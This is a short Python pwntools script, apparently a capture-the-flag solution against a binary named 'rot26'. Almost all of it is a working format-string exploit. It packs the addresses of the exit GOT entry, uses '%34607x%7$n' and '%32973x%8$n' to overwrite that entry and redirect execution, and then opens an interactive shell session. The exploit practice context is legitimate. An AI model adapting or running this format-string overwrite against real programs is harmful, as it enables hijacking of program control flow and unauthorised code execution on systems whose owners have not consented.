from pwn import *


e = ELF('./rot26')
p = process('./rot26')

exit_got = e.got['exit']

def padding(s):
	return s	+"x"*(4096-len(s))

payload = ''
payload += p32(exit_got)
payload += p32(exit_got+2)
payload += "%34607x"
payload += "%7$n"
payload += "%32973x"
payload += "%8$n"

p.sendline(payload)
p.interactive()